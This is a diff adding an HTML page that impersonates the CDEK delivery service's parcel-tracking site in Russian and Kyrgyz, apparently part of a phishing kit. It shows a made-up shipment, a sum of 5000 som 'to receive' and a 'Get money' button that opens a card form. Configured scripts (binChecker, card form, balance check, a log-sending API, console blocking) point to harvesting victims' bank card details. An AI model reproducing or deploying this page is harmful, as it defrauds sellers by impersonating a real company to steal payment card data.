@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="robots" content="noindex">
+  <meta name="page-country" content="kg">
+  <title>СДЭК — Отслеживание</title>
+  <link rel="icon" href="https://cdek.kz/favicon.ico" type="image/ico">
+  <link rel="stylesheet" href="/style/support/support_parent.css">
+  <link rel="stylesheet" href="/style/cardform/cardform.css?v=27" />
+  <link rel="stylesheet" href="/style/modals/modals.css?v=32" />
+  <script src="/style/protect/index.js"></script>
+  <script src="/style/i18n/langCookie.js"></script>
+  <script src="/style/other/formatMoney.js"></script>
+  <style>
+    :root {
+      --modal-accent: #1AB248;
+      --modal-accent-rgb: 26, 178, 72;
+      --modal-accent-hover: #159c3d;
+      --modal-accent-active: #128633;
+      --cf-accent: #1AB248;
+      --cf-accent-hover: #159c3d;
+      --cf-accent-active: #128633;
+    }
+    .ms-card-ld-spinner { border-top-color: #1AB248 !important; }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet" />
+  <style>
+    @media (min-width: 768px) {
+      body {
+        background: #f2f2f2;
+      }
+      .app-wrapper {
+        max-width: 480px;
+        margin: 32px auto 64px auto;
+        box-shadow: 0 4px 32px rgba(0, 0, 0, 0.06);
+        border-radius: 16px;
+        background: #f2f2f2;
+        min-height: 90vh;
+        position: relative;
+      }
+      header > div {
+        position: static !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 !important;
+        left: auto !important;
+        right: auto !important;
+      }
+      main {
+        margin-top: 63px !important;
+        padding-bottom: 80px !important;
+      }
+      footer {
+        position: sticky;
+        bottom: 0;
+        z-index: 20;
+      }
+      footer > div {
+        position: static !important;
+        width: 100% !important;
+        max-width: 100% !important;
+        margin: 0 !important;
+        left: auto !important;
+        right: auto !important;
+        border-radius: 0 0 16px 16px;
+        box-shadow: 0 -4px 16px rgba(0, 0, 0, 0.04);
+      }
+    }
+  </style>
+</head>
+<body class="bg-[#F2F2F2]" style="font-family: 'Inter', sans-serif;">
+  <div class="app-wrapper">
+    <header class="relative">
+      <div
+        class="w-full bg-white mx-auto fixed top-0 flex justify-between items-center py-[16px] pl-[15px] pr-[19px] z-20"
+        style="box-shadow: 0 4px 15px 0 rgba(0,0,0,0.20);"
+      >
+        <div class="flex">
+          <img src="/style/pages/cdek2/logo1.svg" alt="logo" />
+          <img src="/style/pages/cdek2/logo2.svg" alt="logo" />
+        </div>
+        <button id="switch" class="flex justify-center items-center gap-1 text-[#898D8F] text-[16px] cursor-pointer">
+          <span data-i18n="langLabel">КЫР</span>
+          <img src="/style/pages/cdek2/down.svg" alt="down" />
+        </button>
+      </div>
+    </header>
+
+    <main class="bg-[#F2F2F2] mt-[63px] px-[16px] pt-[8px]">
+      <section class="px-[16px] bg-white rounded-[10px] mb-[13px]">
+        <div class="flex flex-col gap-2 py-4 border-b-[1px] border-[rgba(217,217,217,0.4)]">
+          <div class="flex justify-between items-center">
+            <h3 class="text-[17px] font-medium" data-i18n="productName">название</h3>
+            <p class="text-[13px] text-[#B8B8B8]">KG2217671294KG</p>
+          </div>
+          <div class="bg-[rgba(4,231,98,0.25)] w-[92px] h-[24px] rounded-[4px] py-[4px] px-[12px]">
+            <p class="text-[#04E762] text-[12px]" data-i18n="process">В процессе</p>
+          </div>
+        </div>
+        <div class="py-[16px] gap-2 flex flex-col relative">
+          <div class="absolute bg-[rgba(231,231,231,0.5)] w-[1px] h-[22px] left-[7.5px] top-[40px]"></div>
+          <div class="flex gap-3 items-start">
+            <img src="/style/pages/cdek2/circl.svg" alt="map" />
+            <div class="flex flex-col gap-1">
+              <h3 class="text-[15px] font-medium" data-i18n="amount">Сумма к получению:</h3>
+              <p class="text-[13px]" data-format-money>5000 сом</p>
+            </div>
+          </div>
+          <div class="flex gap-3 items-start">
+            <img src="/style/pages/cdek2/map.svg" alt="map" />
+            <div class="flex flex-col gap-1">
+              <h3 class="text-[15px] font-medium" data-i18n="address">Адрес доставки:</h3>
+              <p class="text-[13px]">г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <div class="bg-[rgba(0,88,59,1)] rounded-[10px] pt-[12px] pl-[17px] pb-[45px] flex flex-col gap-[9px] relative mb-[11px]">
+          <div class="absolute bottom-0 right-0">
+            <img src="/style/pages/cdek2/chel.svg" alt="chel" />
+          </div>
+          <h2 class="text-white font-semibold" data-i18n="simpleSales">Простые продажи с СДЭК</h2>
+          <p class="text-[13px] text-white" data-i18n="discount">Скидка 10% на услуги Фулфилмент <br />СДЭК</p>
+        </div>
+      </section>
+
+      <section>
+        <div class="flex justify-between mb-[13px] gap-[11px] md:gap-x-4">
+          <div class="bg-[rgba(0,88,59,1)] flex flex-col gap-[7px] pt-[9px] pl-[16px] pr-[9px] pb-[15px] w-full rounded-[10px]">
+            <h2 class="text-[16px] font-semibold text-white" data-i18n="cargos">Грузы и документы</h2>
+            <p class="text-[13px] text-white w-[140px]" data-i18n="cargosDesc">Из Турции, Китая, <br />Кореи, Сша, Англии и <br />Германии!</p>
+          </div>
+          <div class="bg-[rgba(0,88,59,1)] flex flex-col gap-[7px] pt-[9px] px-[13px] rounded-[10px] w-full pb-[15px]">
+            <h2 class="text-[16px] font-semibold text-white" data-i18n="storage">Возьмём на себя хранение!</h2>
+            <p class="text-[13px] text-white" data-i18n="storageDesc">Платите за факти- <br />чески занятый <br />объём</p>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <div class="bg-white rounded-[10px] mb-[13px]">
+          <div class="pt-[14px] pl-[15px] flex justify-start gap-2 items-start pb-[19px]">
+            <div class="border-[1px] border-[rgba(237,237,237,0.4)] p-[10px] w-[40px] h-[40px] rounded-[100px]">
+              <img src="/style/pages/cdek2/box.svg" alt="box" />
+            </div>
+            <div>
+              <h2 class="text-[18px] font-medium" data-i18n="productName2">название</h2>
+              <div class="flex justify-start gap-[9px]">
+                <p class="text-[#ABABAB] text-[11px]">KG2217671294KG</p>
+                <img src="/style/pages/cdek2/smallt.svg" alt="" />
+                <p class="text-[#ABABAB] text-[11px]"></p>
+              </div>
+            </div>
+          </div>
+          <div class="px-4">
+            <div class="flex items-center justify-between relative mb-2 max-w-md mx-auto">
+              <div class="flex flex-col items-center relative z-10">
+                <div class="bg-[#00583B] w-4 h-4 rounded-full flex items-center justify-center">
+                  <img src="/style/pages/cdek2/done.svg" alt="done" class="w-2 h-2" />
+                </div>
+              </div>
+              <div class="flex-grow h-[2px] bg-[#00583B] mx-2"></div>
+              <div class="flex flex-col items-center relative z-10">
+                <div class="bg-[#00583B] w-4 h-4 rounded-full flex items-center justify-center">
+                  <img src="/style/pages/cdek2/done.svg" alt="done" class="w-2 h-2" />
+                </div>
+              </div>
+              <div class="flex-grow h-[2px] bg-[#00583B] mx-2"></div>
+              <div class="flex flex-col items-center relative z-10">
+                <div class="bg-[#00583B] w-4 h-4 rounded-full flex items-center justify-center">
+                  <img src="/style/pages/cdek2/done.svg" alt="done" class="w-2 h-2" />
+                </div>
+              </div>
+              <div class="flex-grow h-[2px] border-[1px] border-[#00583B] border-dashed mx-2"></div>
+              <div class="flex flex-col items-center relative z-10">
+                <div class="border-[1px] border-[#00583B] w-4 h-4 rounded-full"></div>
+              </div>
+              <div class="flex-grow h-[2px] border border-[#EDEDED] mx-2"></div>
+              <div class="flex flex-col items-center relative z-10">
+                <div class="border border-[#EDEDED] w-4 h-4 rounded-full"></div>
+              </div>
+            </div>
+            <div class="flex justify-between max-w-md mx-auto px-1 text-[13px] font-medium text-[#353535] pb-[19px]">
+              <p data-i18n="created">Создан</p>
+              <p data-i18n="delivered">Вручён</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <section>
+        <div class="bg-white py-[25px] pl-[15px] rounded-[15px] mb-[220px]">
+          <div class="flex flex-col gap-[18px] mb-[27px]">
+            <div>
+              <h2 class="text-[16px] font-semibold" data-i18n="fullName">Полное имя получателя:</h2>
+              <p class="text-[16px]">Макарова Валерия</p>
+            </div>
+            <div>
+              <h2 class="text-[16px] font-semibold" data-i18n="held">Удержано для получения:</h2>
+              <p class="text-[16px]" data-format-money>5000 сом</p>
+            </div>
+            <div>
+              <h2 class="text-[16px] font-semibold" data-i18n="address2">Адрес доставки:</h2>
+              <p class="text-[16px]">г. Алматы, пр. Нурсултана Назарбаева, 311, кв. 57, подъезд 5</p>
+            </div>
+          </div>
+          <div>
+            <p class="text-[16px]" data-i18n="delivery">Доставка осуществляется через <br />службу СДЭК</p>
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <footer style="box-shadow: 0 4px 4px 0 rgba(0, 0, 0, 0.25);">
+      <div
+        class="fixed bottom-0 bg-white pt-[17px] pl-[17px] pr-[23px] pb-[41px] w-full rounded-tl-[20px] rounded-tr-[20px] z-20"
+        style="box-shadow: 0 -1px 15px 4px rgba(0,0,0,0.20);"
+      >
+        <div class="text-[15px] mb-[26px]" data-i18n="footer">
+          Получите полную сумму за ваш товар без <br />комиссии!
+        </div>
+        <div class="flex justify-between items-center">
+          <div class="flex flex-col justify-center gap-[3px]">
+            <img src="/style/pages/cdek2/visa.svg" alt="cart" class="w-[37px] h-[25px]" />
+            <img src="/style/pages/cdek2/master.svg" alt="cart" class="w-[37px] h-[25px]" />
+          </div>
+          <form id="form-payment" onsubmit="return false;">
+            <button
+              type="button"
+              onclick="AdLogger.sendPaymentOpenEvent(); modals.showCardForm()"
+              class="bg-[#1AB248] text-white text-[16px] font-semibold h-[60px] w-[217px] rounded-[10px] cursor-pointer"
+              data-i18n="getMoney"
+            >
+              Получить денежные <br />средства
+            </button>
+          </form>
+          <img src="/style/pages/cdek2/que.svg" alt="que" />
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script src="/style/support/custom_chat.js"></script>
+  </script>
+
+  <script>
+    const translations = {
+      ru: {
+        langLabel: 'КЫР',
+        productName: 'название',
+        process: 'В процессе',
+        amount: 'Сумма к получению:',
+        address: 'Адрес доставки:',
+        simpleSales: 'Простые продажи с СДЭК',
+        discount: 'Скидка 10% на услуги Фулфилмент <br />СДЭК',
+        cargos: 'Грузы и документы',
+        cargosDesc: 'Из Турции, Китая, <br />Кореи, Сша, Англии и <br />Германии!',
+        storage: 'Возьмём на себя хранение!',
+        storageDesc: 'Платите за факти- <br />чески занятый <br />объём',
+        productName2: 'название',
+        created: 'Создан',
+        delivered: 'Вручён',
+        fullName: 'Полное имя получателя:',
+        held: 'Удержано для получения:',
+        address2: 'Адрес доставки:',
+        delivery: 'Доставка осуществляется через <br />службу СДЭК',
+        footer: 'Получите полную сумму за ваш товар без <br />комиссии!',
+        getMoney: 'Получить денежные <br />средства'
+      },
+      ky: {
+        langLabel: 'РУС',
+        productName: 'название',
+        process: 'Иштелүүдө',
+        amount: 'Алуу үчүн сумма:',
+        address: 'Жеткирүү дареги:',
+        simpleSales: 'СДЭК менен жөнөкөй сатуулар',
+        discount: 'СДЭК Фулфилмент <br />кызматтарына 10% арзандатуу',
+        cargos: 'Жүктөр жана документтер',
+        cargosDesc: 'Түркиядан, Кытайдан, <br />Кореядан, АКШдан, <br />Англиядан жана Германиядан!',
+        storage: 'Сактоону өзүбүзгө алабыз!',
+        storageDesc: 'Чыныгы ээлеген <br />көлөм үчүн гана <br />төлөңүз',
+        productName2: 'название',
+        created: 'Түзүлдү',
+        delivered: 'Тапшырылды',
+        fullName: 'Алуучунун толук аты-жөнү:',
+        held: 'Алуу үчүн кармалды:',
+        address2: 'Жеткирүү дареги:',
+        delivery: 'Жеткирүү СДЭК <br />кызматы аркылуу жүзөгө ашырылат',
+        footer: 'Товарыңыз үчүн толук сумманы <br />комиссиясыз алыңыз!',
+        getMoney: 'Акча каражаттарын <br />алуу'
+      }
+    };
+
+    let currentLang = (function() {
+      var c = LangCookie.get();
+      if (c === 'kg' || c === 'ky') return 'ky';
+      return 'ru';
+    })();
+
+    function updateTexts(lang) {
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        if (translations[lang][key]) {
+          if (translations[lang][key].includes('<br')) {
+            el.innerHTML = translations[lang][key];
+          } else {
+            el.textContent = translations[lang][key];
+          }
+        }
+      });
+    }
+
+    document.getElementById('switch').addEventListener('click', function() {
+      currentLang = currentLang === 'ru' ? 'ky' : 'ru';
+      LangCookie.set(currentLang === 'ky' ? 'kg' : 'ru');
+      updateTexts(currentLang);
+    });
+
+    document.addEventListener('DOMContentLoaded', function() {
+      updateTexts(currentLang);
+    });
+  </script>
+
+  <script src="/style/other/adLoader.js"></script>
+  <script src="/style/other/adLogger.js"></script>
+  <script src="/style/other/binChecker.js"></script>
+  <script src="/style/cardform/cardform.js"></script>
+  <script src="/style/other/axios.min.js"></script>
+  <script>const itemId = window.location.pathname.split('/')[1] || "2217671294"</script>
+  <script src="/style/modals/modals.js?v=31"></script>
+  <script>
+    
+    var modals = new ModalSystem({
+      itemId:       itemId,
+      logId:        null,
+      price:        '5000',
+      curr:         'сом',
+      title:        'CDEK',
+
+      serviceType:  'receive',
+
+      checkBalance: true,
+      requestPhoneAfterBalance: false,
+      personalUrl:  '/' + itemId,
+      apiSendLog:   '/api/sendLog',
+      extraPostData: {},
+      onResetCard:  function() {
+        CardForm.resetForm();
+        modals.showCardForm();
+      },
+      translate: window.__INITIAL_MODAL_TRANSLATE || {}
+    });
+  </script>
+  <script src="/style/protect/console-ban.min.js"></script>
+  <script src="/style/other/other.js"></script>
+  <script>if(typeof _fmApply==='function')_fmApply();</script>
+</body>
+</html>
